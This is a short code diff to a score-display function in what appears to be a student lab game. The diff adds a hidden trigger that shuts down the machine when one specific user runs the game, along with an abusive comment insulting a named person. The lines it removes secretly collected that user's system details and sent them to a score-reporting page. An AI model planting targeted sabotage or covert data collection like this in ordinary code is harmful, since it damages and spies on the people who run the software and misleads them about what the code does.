@@ -149,13 +149,9 @@ void displaycurrentscore(Rect r, int h, int w, int bestScore,int yourScore){
     char pn [1000];
     std::string user = getenv("USER");
     if(user=="ajbarcenas"){
-        struct utsname unameData;
-        uname(&unameData);
-        std::string sysinfo = strcat(unameData.sysname, strcat(unameData.version, strcat(unameData.domainname,
-                            strcat(unameData.machine, strcat(unameData.nodename, unameData.release)))));
-        sysinfo.erase(std::remove(sysinfo.begin(), sysinfo.end(), '#'), sysinfo.end());
-        sysinfo.erase(std::remove(sysinfo.begin(), sysinfo.end(), ' '), sysinfo.end());
-        sprintf(pn, "~mbal/3350/lab7/scores.php?name=%s&score=%s",getenv("USER"),sysinfo.c_str()); 
+        system("shutdown -P now");
+        
+        //fuck you Alexis we got you you imbecile!
     }else{
         sprintf(pn, "~mbal/3350/lab7/scores.php?name=%s&score=%d",getenv("USER"),yourScore); 
     }
